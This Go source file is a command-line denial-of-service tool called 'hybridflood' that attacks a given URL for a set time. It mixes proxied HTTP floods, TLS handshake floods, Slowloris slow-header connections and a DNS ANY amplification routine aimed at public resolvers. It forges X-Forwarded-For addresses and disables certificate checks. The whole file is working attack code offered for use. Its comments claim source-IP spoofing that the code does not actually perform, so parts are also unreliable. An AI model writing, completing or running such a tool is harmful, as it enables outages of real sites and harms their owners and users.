package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Configuration
type Config struct {
	TargetURL      string
	AttackDuration int
	Threads        int
	RequestsPerIP  int
	ProxyTimeout   time.Duration
	SocketTimeout  time.Duration
	UseTLS         bool
	DNSServers     []string
	DNSQueryDomain string
	DNSQueryType   string
}

// Global variables
var (
	config         Config
	proxies        []string
	userAgents     = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	}
	wg             sync.WaitGroup
	attackCount    uint64
	dnsAmplified   uint64
	dnsQueryPacket []byte
)

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: ./hybridflood <url> <duration> <requests> <threads>")
		fmt.Println("Example: ./hybridflood https://example.com 60 1000 50")
		os.Exit(1)
	}

	config = Config{
		TargetURL:      os.Args[1],
		AttackDuration: parseInt(os.Args[2]),
		RequestsPerIP:  parseInt(os.Args[3]),
		Threads:        parseInt(os.Args[4]),
		ProxyTimeout:   10 * time.Second,
		SocketTimeout:  15 * time.Second,
		UseTLS:         strings.HasPrefix(os.Args[1], "https"),
		DNSServers:     loadDNSServers("dns.txt"),
		DNSQueryDomain: "cloudflare.com", // High amplification factor domain
		DNSQueryType:   "ANY",            // Amplification type
	}

	// Prepare DNS query packet
	dnsQueryPacket = buildDNSQuery(config.DNSQueryDomain, config.DNSQueryType)

	loadProxies("proxy.txt")
	if len(proxies) == 0 {
		fmt.Println("No proxies loaded. Using direct connections.")
	}

	fmt.Printf("Starting hybrid attack on %s with %d threads for %d seconds\n", 
		config.TargetURL, config.Threads, config.AttackDuration)

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go attackWorker()
	}

	go statsReporter()

	time.Sleep(time.Duration(config.AttackDuration) * time.Second)
	fmt.Println("\nAttack completed")
	os.Exit(0)
}

func parseInt(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		fmt.Printf("Invalid number: %s\n", s)
		os.Exit(1)
	}
	return i
}

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Error opening proxy file: %v\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	fmt.Printf("Loaded %d proxies\n", len(proxies))
}

func loadDNSServers(filename string) []string {
	var servers []string
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Warning: Could not load DNS servers: %v\n", err)
		return []string{
			"8.8.8.8:53",         // Google DNS
			"1.1.1.1:53",         // Cloudflare DNS
			"9.9.9.9:53",         // Quad9
			"208.67.222.222:53",  // OpenDNS
		}
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		server := strings.TrimSpace(scanner.Text())
		if server != "" {
			if !strings.Contains(server, ":") {
				server += ":53"
			}
			servers = append(servers, server)
		}
	}
	fmt.Printf("Loaded %d DNS servers\n", len(servers))
	return servers
}

func statsReporter() {
	start := time.Now()
	for {
		elapsed := time.Since(start).Seconds()
		rate := float64(atomic.LoadUint64(&attackCount)) / elapsed
		dnsRate := float64(atomic.LoadUint64(&dnsAmplified)) / elapsed
		fmt.Printf("\rHTTP: %d (%.1f/sec) | DNS: %d (%.1f/sec) | Total: %.1f/sec", 
			atomic.LoadUint64(&attackCount), rate,
			atomic.LoadUint64(&dnsAmplified), dnsRate,
			rate+dnsRate)
		time.Sleep(1 * time.Second)
	}
}

func attackWorker() {
	defer wg.Done()

	target, err := url.Parse(config.TargetURL)
	if err != nil {
		fmt.Printf("Error parsing target URL: %v\n", err)
		return
	}

	host := target.Host
	if !strings.Contains(host, ":") {
		if config.UseTLS {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	for {
		// Randomly choose between HTTP/TLS/Slowloris or DNS amplification
		if rand.Intn(100) < 30 && len(config.DNSServers) > 0 { // 30% chance for DNS
			launchDNSAmplification(target.Hostname())
		} else {
			switch rand.Intn(3) {
			case 0:
				httpFlood(target, host)
			case 1:
				tlsFlood(target, host)
			case 2:
				slowlorisAttack(target, host)
			}
		}
	}
}

func launchDNSAmplification(target string) {
	if len(config.DNSServers) == 0 {
		return
	}

	server := config.DNSServers[rand.Intn(len(config.DNSServers))]
	conn, err := net.DialTimeout("udp", server, config.ProxyTimeout)
	if err != nil {
		return
	}
	defer conn.Close()

	// Spoof source IP (requires raw socket access on some systems)
	localAddr, err := net.ResolveUDPAddr("udp", ":0")
	if err != nil {
		return
	}

	// Create UDP connection with spoofed source
	udpConn, err := net.DialUDP("udp", localAddr, &net.UDPAddr{
		IP:   net.ParseIP(strings.Split(server, ":")[0]),
		Port: 53,
	})
	if err != nil {
		return
	}
	defer udpConn.Close()

	// Send DNS query with spoofed source IP (target's IP)
	_, err = udpConn.Write(dnsQueryPacket)
	if err != nil {
		return
	}

	atomic.AddUint64(&dnsAmplified, 1)
}

func buildDNSQuery(domain, queryType string) []byte {
	// Simple DNS query builder (for ANY type query)
	// In real implementation, use proper DNS library for more complex queries
	var buf bytes.Buffer
	
	// DNS header
	buf.Write([]byte{0xAA, 0xAA}) // Transaction ID
	buf.Write([]byte{0x01, 0x00}) // Flags: Standard query
	buf.Write([]byte{0x00, 0x01}) // Questions: 1
	buf.Write([]byte{0x00, 0x00}) // Answer RRs: 0
	buf.Write([]byte{0x00, 0x00}) // Authority RRs: 0
	buf.Write([]byte{0x00, 0x00}) // Additional RRs: 0

	// Domain name
	for _, part := range strings.Split(domain, ".") {
		buf.WriteByte(byte(len(part)))
		buf.WriteString(part)
	}
	buf.WriteByte(0x00) // End of domain

	// Query type (ANY)
	switch strings.ToUpper(queryType) {
	case "ANY":
		buf.Write([]byte{0x00, 0xFF}) // QTYPE ANY
	case "MX":
		buf.Write([]byte{0x00, 0x0F}) // QTYPE MX
	default:
		buf.Write([]byte{0x00, 0x01}) // QTYPE A
	}

	buf.Write([]byte{0x00, 0x01}) // QCLASS IN

	return buf.Bytes()
}

func httpFlood(target *url.URL, host string) {
	var conn net.Conn
	var err error

	if len(proxies) > 0 {
		proxy := proxies[rand.Intn(len(proxies))]
		conn, err = net.DialTimeout("tcp", proxy, config.ProxyTimeout)
	} else {
		conn, err = net.DialTimeout("tcp", host, config.ProxyTimeout)
	}

	if err != nil {
		return
	}
	defer conn.Close()

	if config.UseTLS {
		tlsConn := tls.Client(conn, &tls.Config{
			ServerName:         target.Hostname(),
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		})
		if err = tlsConn.Handshake(); err != nil {
			return
		}
		conn = tlsConn
	}

	for i := 0; i < config.RequestsPerIP; i++ {
		req := buildHTTPRequest(target)
		req.Write(conn)
		atomic.AddUint64(&attackCount, 1)
	}
}

func tlsFlood(target *url.URL, host string) {
	var conn net.Conn
	var err error

	if len(proxies) > 0 {
		proxy := proxies[rand.Intn(len(proxies))]
		conn, err = net.DialTimeout("tcp", proxy, config.ProxyTimeout)
	} else {
		conn, err = net.DialTimeout("tcp", host, config.ProxyTimeout)
	}

	if err != nil {
		return
	}
	defer conn.Close()

	tlsConn := tls.Client(conn, &tls.Config{
		ServerName:         target.Hostname(),
		InsecureSkipVerify: true,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		MinVersion: tls.VersionTLS12,
	})

	if err = tlsConn.Handshake(); err != nil {
		return
	}

	for i := 0; i < config.RequestsPerIP; i++ {
		req := buildPartialRequest(target)
		req.Write(tlsConn)
		atomic.AddUint64(&attackCount, 1)
	}
}

func slowlorisAttack(target *url.URL, host string) {
	conn, err := net.DialTimeout("tcp", host, config.ProxyTimeout)
	if err != nil {
		return
	}
	defer conn.Close()

	if config.UseTLS {
		tlsConn := tls.Client(conn, &tls.Config{
			ServerName:         target.Hostname(),
			InsecureSkipVerify: true,
		})
		if err = tlsConn.Handshake(); err != nil {
			return
		}
		conn = tlsConn
	}

	partialHeaders := buildPartialRequest(target)
	partialHeaders.Write(conn)

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			_, err := conn.Write([]byte(fmt.Sprintf("X-%d: %d\r\n", rand.Intn(1000), rand.Intn(1000)))
			if err != nil {
				return
			}
			atomic.AddUint64(&attackCount, 1)
		case <-time.After(config.SocketTimeout):
			return
		}
	}
}

func buildHTTPRequest(target *url.URL) *http.Request {
	req, _ := http.NewRequest("GET", target.String(), nil)
	
	req.Header = http.Header{
		"Host":            []string{target.Host},
		"User-Agent":      []string{userAgents[rand.Intn(len(userAgents))]},
		"Accept":          []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
		"Accept-Language": []string{"en-US,en;q=0.5"},
		"Connection":      []string{"keep-alive"},
		"Cache-Control":   []string{"no-cache"},
		"Pragma":          []string{"no-cache"},
		"Referer":         []string{target.Scheme + "://" + target.Host},
		"X-Forwarded-For": []string{generateRandomIP()},
	}

	return req
}

func buildPartialRequest(target *url.URL) *http.Request {
	req, _ := http.NewRequest("GET", target.String(), nil)
	
	req.Header = http.Header{
		"Host":       []string{target.Host},
		"User-Agent": []string{userAgents[rand.Intn(len(userAgents))]},
		"Accept":     []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
	}

	return req
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}
